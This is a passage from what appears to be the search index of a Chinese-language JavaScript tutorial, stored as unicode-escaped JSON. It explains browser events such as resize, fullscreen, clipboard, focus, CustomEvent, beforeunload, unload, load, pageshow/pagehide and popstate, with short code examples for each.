( document . body . clientWidth < 768 ) { console . log ( '\u79fb\u52a8\u8bbe\u5907\u7684\u89c6\u53e3' ); } }; window . addEventListener ( 'resize' , resizeMethod , true ); \u8be5\u4e8b\u4ef6\u4e5f\u4f1a\u8fde\u7eed\u5730\u5927\u91cf\u89e6\u53d1\uff0c\u6240\u4ee5\u6700\u597d\u50cf\u4e0a\u9762\u7684 scroll \u4e8b\u4ef6\u4e00\u6837\uff0c\u901a\u8fc7 throttle \u51fd\u6570\u63a7\u5236\u4e8b\u4ef6\u89e6\u53d1\u9891\u7387\u3002 fullscreenchange \u4e8b\u4ef6\uff0cfullscreenerror \u4e8b\u4ef6 \u00b6 fullscreenchange \u4e8b\u4ef6\u5728\u8fdb\u5165\u6216\u9000\u51fa\u5168\u5c4f\u72b6\u6001\u65f6\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u53d1\u751f\u5728 document \u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 document . addEventListener ( 'fullscreenchange' , function ( event ) { console . log ( document . fullscreenElement ); }); fullscreenerror \u4e8b\u4ef6\u5728\u6d4f\u89c8\u5668\u65e0\u6cd5\u5207\u6362\u5230\u5168\u5c4f\u72b6\u6001\u65f6\u89e6\u53d1\u3002 \u526a\u8d34\u677f\u4e8b\u4ef6 \u00b6 \u4ee5\u4e0b\u4e09\u4e2a\u4e8b\u4ef6\u5c5e\u4e8e\u526a\u8d34\u677f\u64cd\u4f5c\u7684\u76f8\u5173\u4e8b\u4ef6\u3002 cut \uff1a\u5c06\u9009\u4e2d\u7684\u5185\u5bb9\u4ece\u6587\u6863\u4e2d\u79fb\u9664\uff0c\u52a0\u5165\u526a\u8d34\u677f\u65f6\u89e6\u53d1\u3002 copy \uff1a\u8fdb\u884c\u590d\u5236\u52a8\u4f5c\u65f6\u89e6\u53d1\u3002 paste \uff1a\u526a\u8d34\u677f\u5185\u5bb9\u7c98\u8d34\u5230\u6587\u6863\u540e\u89e6\u53d1\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u5e0c\u671b\u7981\u6b62\u8f93\u5165\u6846\u7684\u7c98\u8d34\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 inputElement . addEventListener ( 'paste' , e => e . preventDefault ()); \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u5f97\u7528\u6237\u65e0\u6cd5\u5728 <input> \u8f93\u5165\u6846\u91cc\u9762\u7c98\u8d34\u5185\u5bb9\u3002 cut \u3001 copy \u3001 paste \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\u7684\u4e8b\u4ef6\u5bf9\u8c61\u90fd\u662f ClipboardEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002 ClipboardEvent \u6709\u4e00\u4e2a\u5b9e\u4f8b\u5c5e\u6027 clipboardData \uff0c\u662f\u4e00\u4e2a DataTransfer \u5bf9\u8c61\uff0c\u5b58\u653e\u526a\u8d34\u7684\u6570\u636e\u3002\u5177\u4f53\u7684 API \u63a5\u53e3\u548c\u64cd\u4f5c\u65b9\u6cd5\uff0c\u8bf7\u53c2\u89c1\u300a\u62d6\u62c9\u4e8b\u4ef6\u300b\u7684 DataTransfer \u5bf9\u8c61\u90e8\u5206\u3002 1 2 3 4 5 document . addEventListener ( 'copy' , function ( e ) { e . clipboardData . setData ( 'text/plain' , 'Hello, world!' ); e . clipboardData . setData ( 'text/html' , '<b>Hello, world!</b>' ); e . preventDefault (); }); \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u5f97\u590d\u5236\u8fdb\u5165\u526a\u8d34\u677f\u7684\uff0c\u90fd\u662f\u5f00\u53d1\u8005\u6307\u5b9a\u7684\u6570\u636e\uff0c\u800c\u4e0d\u662f\u7528\u6237\u60f3\u8981\u62f7\u8d1d\u7684\u6570\u636e\u3002 \u7126\u70b9\u4e8b\u4ef6 \u00b6 \u7126\u70b9\u4e8b\u4ef6\u53d1\u751f\u5728\u5143\u7d20\u8282\u70b9\u548c document \u5bf9\u8c61\u4e0a\u9762\uff0c\u4e0e\u83b7\u5f97\u6216\u5931\u53bb\u7126\u70b9\u76f8\u5173\u3002\u5b83\u4e3b\u8981\u5305\u62ec\u4ee5\u4e0b\u56db\u4e2a\u4e8b\u4ef6\u3002 focus \uff1a\u5143\u7d20\u8282\u70b9\u83b7\u5f97\u7126\u70b9\u540e\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\u3002 blur \uff1a\u5143\u7d20\u8282\u70b9\u5931\u53bb\u7126\u70b9\u540e\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\u3002 focusin \uff1a\u5143\u7d20\u8282\u70b9\u5c06\u8981\u83b7\u5f97\u7126\u70b9\u65f6\u89e6\u53d1\uff0c\u53d1\u751f\u5728 focus \u4e8b\u4ef6\u4e4b\u524d\u3002\u8be5\u4e8b\u4ef6\u4f1a\u5192\u6ce1\u3002 focusout \uff1a\u5143\u7d20\u8282\u70b9\u5c06\u8981\u5931\u53bb\u7126\u70b9\u65f6\u89e6\u53d1\uff0c\u53d1\u751f\u5728 blur \u4e8b\u4ef6\u4e4b\u524d\u3002\u8be5\u4e8b\u4ef6\u4f1a\u5192\u6ce1\u3002 \u8fd9\u56db\u4e2a\u4e8b\u4ef6\u7684\u4e8b\u4ef6\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 FocusEvent \u63a5\u53e3\u3002 FocusEvent \u5b9e\u4f8b\u5177\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 FocusEvent.target \uff1a\u4e8b\u4ef6\u7684\u76ee\u6807\u8282\u70b9\u3002 FocusEvent.relatedTarget \uff1a\u5bf9\u4e8e focusin \u4e8b\u4ef6\uff0c\u8fd4\u56de\u5931\u53bb\u7126\u70b9\u7684\u8282\u70b9\uff1b\u5bf9\u4e8e focusout \u4e8b\u4ef6\uff0c\u8fd4\u56de\u5c06\u8981\u63a5\u53d7\u7126\u70b9\u7684\u8282\u70b9\uff1b\u5bf9\u4e8e focus \u548c blur \u4e8b\u4ef6\uff0c\u8fd4\u56de null \u3002 \u7531\u4e8e focus \u548c blur \u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\uff0c\u53ea\u80fd\u5728\u6355\u83b7\u9636\u6bb5\u89e6\u53d1\uff0c\u6240\u4ee5 addEventListener \u65b9\u6cd5\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u9700\u8981\u8bbe\u4e3a true \u3002 1 2 3 4 5 6 7 form . addEventListener ( 'focus' , function ( event ) { event . target . style . background = 'pink' ; }, true ); form . addEventListener ( 'blur' , function ( event ) { event . target . style . background = '' ; }, true ); \u4e0a\u9762\u4ee3\u7801\u9488\u5bf9\u8868\u5355\u7684\u6587\u672c\u8f93\u5165\u6846\uff0c\u63a5\u53d7\u7126\u70b9\u65f6\u8bbe\u7f6e\u80cc\u666f\u8272\uff0c\u5931\u53bb\u7126\u70b9\u65f6\u53bb\u9664\u80cc\u666f\u8272\u3002 CustomEvent \u63a5\u53e3 \u00b6 CustomEvent \u63a5\u53e3\u7528\u4e8e\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u4e8b\u4ef6\u5b9e\u4f8b\u3002\u90a3\u4e9b\u6d4f\u89c8\u5668\u9884\u5b9a\u4e49\u7684\u4e8b\u4ef6\uff0c\u867d\u7136\u53ef\u4ee5\u624b\u52a8\u751f\u6210\uff0c\u4f46\u662f\u5f80\u5f80\u4e0d\u80fd\u5728\u4e8b\u4ef6\u4e0a\u7ed1\u5b9a\u6570\u636e\u3002\u5982\u679c\u9700\u8981\u5728\u89e6\u53d1\u4e8b\u4ef6\u7684\u540c\u65f6\uff0c\u4f20\u5165\u6307\u5b9a\u7684\u6570\u636e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 CustomEvent \u63a5\u53e3\u751f\u6210\u7684\u81ea\u5b9a\u4e49\u4e8b\u4ef6\u5bf9\u8c61\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b CustomEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 CustomEvent \u4e8b\u4ef6\u5b9e\u4f8b\u3002 1 new CustomEvent ( type , options ) CustomEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u540d\u5b57\uff0c\u8fd9\u662f\u5fc5\u987b\u7684\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\u3002 CustomEvent \u7684\u914d\u7f6e\u5bf9\u8c61\u9664\u4e86\u63a5\u53d7 Event \u4e8b\u4ef6\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u53ea\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u5c5e\u6027\u3002 detail \uff1a\u8868\u793a\u4e8b\u4ef6\u7684\u9644\u5e26\u6570\u636e\uff0c\u9ed8\u8ba4\u4e3a null \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 var event = new CustomEvent ( 'build' , { 'detail' : 'hello' }); function eventHandler ( e ) { console . log ( e . detail ); } document . body . addEventListener ( 'build' , function ( e ) { console . log ( e . detail ); }); document . body . dispatchEvent ( event ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u624b\u52a8\u5b9a\u4e49\u4e86 build \u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u89e6\u53d1\u540e\uff0c\u4f1a\u88ab\u76d1\u542c\u5230\uff0c\u4ece\u800c\u8f93\u51fa\u8be5\u4e8b\u4ef6\u5b9e\u4f8b\u7684 detail \u5c5e\u6027\uff08\u5373\u5b57\u7b26\u4e32 hello \uff09\u3002 \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var myEvent = new CustomEvent ( 'myevent' , { detail : { foo : 'bar' }, bubbles : true , cancelable : false }); el . addEventListener ( 'myevent' , function ( event ) { console . log ( 'Hello ' + event . detail . foo ); }); el . dispatchEvent ( myEvent ); \u4e0a\u9762\u4ee3\u7801\u4e5f\u8bf4\u660e\uff0cCustomEvent \u7684\u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u9664\u4e86\u5177\u6709 Event \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027\uff0c\u8fd8\u5177\u6709 detail \u5c5e\u6027\u3002","title":"\u5176\u4ed6\u5e38\u89c1\u4e8b\u4ef6"},{"location":"events/common/#_1","text":"","title":"\u5176\u4ed6\u5e38\u89c1\u4e8b\u4ef6"},{"location":"events/common/#_2","text":"","title":"\u8d44\u6e90\u4e8b\u4ef6"},{"location":"events/common/#beforeunload","text":"beforeunload \u4e8b\u4ef6\u5728\u7a97\u53e3\u3001\u6587\u6863\u3001\u5404\u79cd\u8d44\u6e90\u5c06\u8981\u5378\u8f7d\u524d\u89e6\u53d1\u3002\u5b83\u53ef\u4ee5\u7528\u6765\u9632\u6b62\u7528\u6237\u4e0d\u5c0f\u5fc3\u5378\u8f7d\u8d44\u6e90\u3002 \u5982\u679c\u8be5\u4e8b\u4ef6\u5bf9\u8c61\u7684 returnValue \u5c5e\u6027\u662f\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u5c31\u4f1a\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u8be2\u95ee\u7528\u6237\u662f\u5426\u8981\u5378\u8f7d\u8be5\u8d44\u6e90\u3002\u4f46\u662f\uff0c\u7528\u6237\u6307\u5b9a\u7684\u5b57\u7b26\u4e32\u53ef\u80fd\u65e0\u6cd5\u663e\u793a\uff0c\u6d4f\u89c8\u5668\u4f1a\u5c55\u793a\u9884\u5b9a\u4e49\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u7528\u6237\u70b9\u51fb\u201c\u53d6\u6d88\u201d\u6309\u94ae\uff0c\u8d44\u6e90\u5c31\u4e0d\u4f1a\u5378\u8f7d\u3002 1 2 3 window . addEventListener ( 'beforeunload' , function ( event ) { event . returnValue = '\u4f60\u786e\u5b9a\u79bb\u5f00\u5417\uff1f' ; }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u5982\u679c\u5173\u95ed\u7a97\u53e3\uff0c\u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3\uff0c\u8981\u6c42\u7528\u6237\u786e\u8ba4\u3002 \u6d4f\u89c8\u5668\u5bf9\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u884c\u4e3a\u5f88\u4e0d\u4e00\u81f4\uff0c\u6709\u7684\u6d4f\u89c8\u5668\u8c03\u7528 event.preventDefault() \uff0c\u4e5f\u4f1a\u5f39\u51fa\u5bf9\u8bdd\u6846\u3002IE \u6d4f\u89c8\u5668\u9700\u8981\u663e\u5f0f\u8fd4\u56de\u4e00\u4e2a\u975e\u7a7a\u7684\u5b57\u7b26\u4e32\uff0c\u624d\u4f1a\u5f39\u51fa\u5bf9\u8bdd\u6846\u3002\u800c\u4e14\uff0c\u5927\u591a\u6570\u6d4f\u89c8\u5668\u5728\u5bf9\u8bdd\u6846\u4e2d\u4e0d\u663e\u793a\u6307\u5b9a\u6587\u672c\uff0c\u53ea\u663e\u793a\u9ed8\u8ba4\u6587\u672c\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\uff0c\u53d6\u5f97\u6700\u5927\u7684\u517c\u5bb9\u6027\u3002 1 2 3 4 5 6 window . addEventListener ( 'beforeunload' , function ( e ) { var confirmationMessage = '\u786e\u8ba4\u5173\u95ed\u7a97\u53e3\uff1f' ; e . returnValue = confirmationMessage ; return confirmationMessage ; }); \u6ce8\u610f\uff0c\u8bb8\u591a\u624b\u673a\u6d4f\u89c8\u5668\uff08\u6bd4\u5982 Safari\uff09\u9ed8\u8ba4\u5ffd\u7565\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u684c\u9762\u6d4f\u89c8\u5668\u4e5f\u6709\u529e\u6cd5\u5ffd\u7565\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u6240\u4ee5\uff0c\u5b83\u53ef\u80fd\u6839\u672c\u4e0d\u4f1a\u751f\u6548\uff0c\u4e0d\u80fd\u4f9d\u8d56\u5b83\u6765\u963b\u6b62\u7528\u6237\u5173\u95ed\u6d4f\u89c8\u5668\u7a97\u53e3\uff0c\u6700\u597d\u4e0d\u8981\u4f7f\u7528\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u53e6\u5916\uff0c\u4e00\u65e6\u4f7f\u7528\u4e86 beforeunload \u4e8b\u4ef6\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u7f13\u5b58\u5f53\u524d\u7f51\u9875\uff0c\u4f7f\u7528\u201c\u56de\u9000\u201d\u6309\u94ae\u5c06\u91cd\u65b0\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u7f51\u9875\u3002\u8fd9\u662f\u56e0\u4e3a\u76d1\u542c\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76ee\u7684\uff0c\u4e00\u822c\u662f\u4e3a\u4e86\u7f51\u9875\u72b6\u6001\uff0c\u8fd9\u65f6\u7f13\u5b58\u9875\u9762\u7684\u521d\u59cb\u72b6\u6001\u5c31\u6ca1\u610f\u4e49\u4e86\u3002","title":"beforeunload \u4e8b\u4ef6"},{"location":"events/common/#unload","text":"unload \u4e8b\u4ef6\u5728\u7a97\u53e3\u5173\u95ed\u6216\u8005 document \u5bf9\u8c61\u5c06\u8981\u5378\u8f7d\u65f6\u89e6\u53d1\u3002\u5b83\u7684\u89e6\u53d1\u987a\u5e8f\u6392\u5728 beforeunload \u3001 pagehide \u4e8b\u4ef6\u540e\u9762\u3002 unload \u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u6587\u6863\u5904\u4e8e\u4e00\u4e2a\u7279\u6b8a\u72b6\u6001\u3002\u6240\u6709\u8d44\u6e90\u4f9d\u7136\u5b58\u5728\uff0c\u4f46\u662f\u5bf9\u7528\u6237\u6765\u8bf4\u90fd\u4e0d\u53ef\u89c1\uff0cUI \u4e92\u52a8\u5168\u90e8\u65e0\u6548\u3002\u8fd9\u4e2a\u4e8b\u4ef6\u662f\u65e0\u6cd5\u53d6\u6d88\u7684\uff0c\u5373\u4f7f\u5728\u76d1\u542c\u51fd\u6570\u91cc\u9762\u629b\u51fa\u9519\u8bef\uff0c\u4e5f\u4e0d\u80fd\u505c\u6b62\u6587\u6863\u7684\u5378\u8f7d\u3002 1 2 3 window . addEventListener ( 'unload' , function ( event ) { console . log ( '\u6587\u6863\u5c06\u8981\u5378\u8f7d' ); }); \u624b\u673a\u4e0a\uff0c\u6d4f\u89c8\u5668\u6216\u7cfb\u7edf\u53ef\u80fd\u4f1a\u76f4\u63a5\u4e22\u5f03\u7f51\u9875\uff0c\u8fd9\u65f6\u8be5\u4e8b\u4ef6\u6839\u672c\u4e0d\u4f1a\u53d1\u751f\u3002\u800c\u4e14\u8ddf beforeunload \u4e8b\u4ef6\u4e00\u6837\uff0c\u4e00\u65e6\u4f7f\u7528\u4e86 unload \u4e8b\u4ef6\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u7f13\u5b58\u5f53\u524d\u7f51\u9875\uff0c\u7406\u7531\u540c\u4e0a\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u4e0d\u5e94\u8be5\u4f9d\u8d56\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u6307\u5b9a\u7f51\u9875\u5378\u8f7d\u65f6\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u8003\u8651\u5b8c\u5168\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u8be5\u4e8b\u4ef6\u53ef\u4ee5\u7528 pagehide \u4ee3\u66ff\u3002","title":"unload \u4e8b\u4ef6"},{"location":"events/common/#load-error","text":"load \u4e8b\u4ef6\u5728\u9875\u9762\u6216\u67d0\u4e2a\u8d44\u6e90\u52a0\u8f7d\u6210\u529f\u65f6\u89e6\u53d1\u3002\u6ce8\u610f\uff0c\u9875\u9762\u6216\u8d44\u6e90\u4ece\u6d4f\u89c8\u5668\u7f13\u5b58\u52a0\u8f7d\uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\u3002 1 2 3 window . addEventListener ( 'load' , function ( event ) { console . log ( '\u6240\u6709\u8d44\u6e90\u90fd\u52a0\u8f7d\u5b8c\u6210' ); }); error \u4e8b\u4ef6\u662f\u5728\u9875\u9762\u6216\u8d44\u6e90\u52a0\u8f7d\u5931\u8d25\u65f6\u89e6\u53d1\u3002 abort \u4e8b\u4ef6\u5728\u7528\u6237\u53d6\u6d88\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\u5b9e\u9645\u4e0a\u5c5e\u4e8e\u8fdb\u5ea6\u4e8b\u4ef6\uff0c\u4e0d\u4ec5\u53d1\u751f\u5728 document \u5bf9\u8c61\uff0c\u8fd8\u53d1\u751f\u5728\u5404\u79cd\u5916\u90e8\u8d44\u6e90\u4e0a\u9762\u3002\u6d4f\u89c8\u7f51\u9875\u5c31\u662f\u4e00\u4e2a\u52a0\u8f7d\u5404\u79cd\u8d44\u6e90\u7684\u8fc7\u7a0b\uff0c\u56fe\u50cf\uff08image\uff09\u3001\u6837\u5f0f\u8868\uff08style sheet\uff09\u3001\u811a\u672c\uff08script\uff09\u3001\u89c6\u9891\uff08video\uff09\u3001\u97f3\u9891\uff08audio\uff09\u3001Ajax\u8bf7\u6c42\uff08XMLHttpRequest\uff09\u7b49\u7b49\u3002\u8fd9\u4e9b\u8d44\u6e90\u548c document \u5bf9\u8c61\u3001 window \u5bf9\u8c61\u3001XMLHttpRequestUpload \u5bf9\u8c61\uff0c\u90fd\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\u548c error \u4e8b\u4ef6\u3002 \u6700\u540e\uff0c\u9875\u9762\u7684 load \u4e8b\u4ef6\u4e5f\u53ef\u4ee5\u7528 pageshow \u4e8b\u4ef6\u4ee3\u66ff\u3002","title":"load \u4e8b\u4ef6\uff0cerror \u4e8b\u4ef6"},{"location":"events/common/#session","text":"","title":"session \u5386\u53f2\u4e8b\u4ef6"},{"location":"events/common/#pageshow-pagehide","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6d4f\u89c8\u5668\u4f1a\u5728\u5f53\u524d\u4f1a\u8bdd\uff08session\uff09\u7f13\u5b58\u9875\u9762\uff0c\u5f53\u7528\u6237\u70b9\u51fb\u201c\u524d\u8fdb/\u540e\u9000\u201d\u6309\u94ae\u65f6\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\u9875\u9762\u3002 pageshow \u4e8b\u4ef6\u5728\u9875\u9762\u52a0\u8f7d\u65f6\u89e6\u53d1\uff0c\u5305\u62ec\u7b2c\u4e00\u6b21\u52a0\u8f7d\u548c\u4ece\u7f13\u5b58\u52a0\u8f7d\u4e24\u79cd\u60c5\u51b5\u3002\u5982\u679c\u8981\u6307\u5b9a\u9875\u9762\u6bcf\u6b21\u52a0\u8f7d\uff08\u4e0d\u7ba1\u662f\u4e0d\u662f\u4ece\u6d4f\u89c8\u5668\u7f13\u5b58\uff09\u65f6\u90fd\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u653e\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 \u7b2c\u4e00\u6b21\u52a0\u8f7d\u65f6\uff0c\u5b83\u7684\u89e6\u53d1\u987a\u5e8f\u6392\u5728 load \u4e8b\u4ef6\u540e\u9762\u3002\u4ece\u7f13\u5b58\u52a0\u8f7d\u65f6\uff0c load \u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\uff0c\u56e0\u4e3a\u7f51\u9875\u5728\u7f13\u5b58\u4e2d\u7684\u6837\u5b50\u901a\u5e38\u662f load \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u8fd0\u884c\u540e\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u4e0d\u5fc5\u91cd\u590d\u6267\u884c\u3002\u540c\u7406\uff0c\u5982\u679c\u662f\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\u9875\u9762\uff0c\u7f51\u9875\u5185\u521d\u59cb\u5316\u7684 JavaScript \u811a\u672c\uff08\u6bd4\u5982 DOMContentLoaded \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff09\u4e5f\u4e0d\u4f1a\u6267\u884c\u3002 1 2 3 window . addEventListener ( 'pageshow' , function ( event ) { console . log ( 'pageshow: ' , event ); }); pageshow \u4e8b\u4ef6\u6709\u4e00\u4e2a persisted \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002\u9875\u9762\u7b2c\u4e00\u6b21\u52a0\u8f7d\u65f6\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f false \uff1b\u5f53\u9875\u9762\u4ece\u7f13\u5b58\u52a0\u8f7d\u65f6\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f true \u3002 1 2 3 4 5 window . addEventListener ( 'pageshow' , function ( event ){ if ( event . persisted ) { // ... } }); pagehide \u4e8b\u4ef6\u4e0e pageshow \u4e8b\u4ef6\u7c7b\u4f3c\uff0c\u5f53\u7528\u6237\u901a\u8fc7\u201c\u524d\u8fdb/\u540e\u9000\u201d\u6309\u94ae\uff0c\u79bb\u5f00\u5f53\u524d\u9875\u9762\u65f6\u89e6\u53d1\u3002\u5b83\u4e0e unload \u4e8b\u4ef6\u7684\u533a\u522b\u5728\u4e8e\uff0c\u5982\u679c\u5728 window \u5bf9\u8c61\u4e0a\u5b9a\u4e49 unload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u540e\uff0c\u9875\u9762\u4e0d\u4f1a\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff0c\u800c\u4f7f\u7528 pagehide \u4e8b\u4ef6\uff0c\u9875\u9762\u4f1a\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\u3002 pagehide \u4e8b\u4ef6\u5b9e\u4f8b\u4e5f\u6709\u4e00\u4e2a persisted \u5c5e\u6027\uff0c\u5c06\u8fd9\u4e2a\u5c5e\u6027\u8bbe\u4e3a true \uff0c\u5c31\u8868\u793a\u9875\u9762\u8981\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff1b\u8bbe\u4e3a false \uff0c\u8868\u793a\u7f51\u9875\u4e0d\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff0c\u8fd9\u65f6\u5982\u679c\u8bbe\u7f6e\u4e86unload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c06\u5728 pagehide \u4e8b\u4ef6\u540e\u7acb\u5373\u8fd0\u884c\u3002 \u5982\u679c\u9875\u9762\u5305\u542b <frame> \u6216 <iframe> \u5143\u7d20\uff0c\u5219 <frame> \u9875\u9762\u7684 pageshow \u4e8b\u4ef6\u548c pagehide \u4e8b\u4ef6\uff0c\u90fd\u4f1a\u5728\u4e3b\u9875\u9762\u4e4b\u524d\u89e6\u53d1\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u53ea\u5728\u6d4f\u89c8\u5668\u7684 history \u5bf9\u8c61\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\uff0c\u8ddf\u7f51\u9875\u662f\u5426\u53ef\u89c1\u6ca1\u6709\u5173\u7cfb\u3002","title":"pageshow \u4e8b\u4ef6\uff0cpagehide \u4e8b\u4ef6"},{"location":"events/common/#popstate","text":"popstate \u4e8b\u4ef6\u5728\u6d4f\u89c8\u5668\u7684 history \u5bf9\u8c61\u7684\u5f53\u524d\u8bb0\u5f55\u53d1\u751f\u663e\u5f0f\u5207\u6362\u65f6\u89e6\u53d1\u3002\u6ce8\u610f\uff0c\u8c03\u7528 history.pushState() \u6216 history.replaceState() \uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1 popstate \u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u53ea\u5728\u7528\u6237\u5728 history \u8bb0\u5f55\u4e4b\u95f4\u663e\u5f0f\u5207\u6362\u65f6\u89e6\u53d1\uff0c\u6bd4\u5982\u9f20\u6807\u70b9\u51fb\u201c\u540e\u9000/\u524d\u8fdb\u201d\u6309\u94ae\uff0c\u6216\u8005\u5728\u811a\u672c\u4e2d\u8c03\u7528 history.back() \u3001 history.forward() \u3001 history.go() \u65f6\u89e6\u53d1\u3002 \u8be5\u4e8b\u4ef6\u5bf9\u8c61\u6709\u4e00\u4e2a state \u5c5e\u6027\uff0c\u4fdd\u5b58 history.pushState \u65b9\u6cd5\u548c history.replaceState \u65b9\u6cd5\u4e3a\u5f53\u524d\u8bb0\u5f55\u6dfb\u52a0\u7684 state \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 window . onpopstate = function ( event ) { console . log ( 'state: ' + event . state ); }; history . pushState ({ page : 1 }, 'title 1' , '?page=1' ); history . pushState ({ page : 2 }, 'title 2' , '?page=2' ); history . replaceState ({ page : 3 }, 'title 3' , '?page=3' ); history . back (); // state: {\"page\":1} history . back (); // state: null history . go ( 2 ); // state: {\"page\":3} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c pushState \u65b9\u6cd5\u5411 history \u6dfb\u52a0\u4e86\u4e24\u6761\u8bb0\u5f55\uff0c\u7136\u540e replaceState \u65b9\u6cd5\u66ff\u6362\u6389\u5f53\u524d\u8bb0\u5f55\u3002\u56e0\u6b64\uff0c\u8fde\u7eed\u4e24\u6b21 back \u65b9\u6cd5\uff0c\u4f1a\u8ba9\u5f53\u524d\u6761\u76ee\u9000\u56de\u5230\u539f\u59cb\u7f51\u5740\uff0c\u5b83\u6ca1\u6709\u9644\u5e26 state \u5bf9\u8c61\uff0c\u6240\u4ee5\u4e8b\u4ef6\u7684 state \u5c5e\u6027\u4e3a null \uff0c\u7136\u540e\u524d\u8fdb\u4e24\u6761\u8bb0\u5f55\uff0c\u53c8\u56de\u5230 replaceState \u65b9\u6cd5\u6dfb\u52a0\u7684\u8bb0\u5f55\u3002 \u6d4f\u89c8\u5668\u5bf9\u4e8e\u9875\u9762\u9996\u6b21\u52a0\u8f7d\uff0c\u662f\u5426\u89e6\u53d1 popstate \u4e8b\u4ef6\uff0c\u5904\u7406\u4e0d\u4e00\u6837\uff0cFirefox \u4e0d\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002","title":"popstate \u4e8b\u4ef6"},{"location":"events/common/#hashchange","text":"hashchange \u4e8b\u4ef6\u5728 URL \u7684 hash \u90e8\u5206\uff08\u5373 # 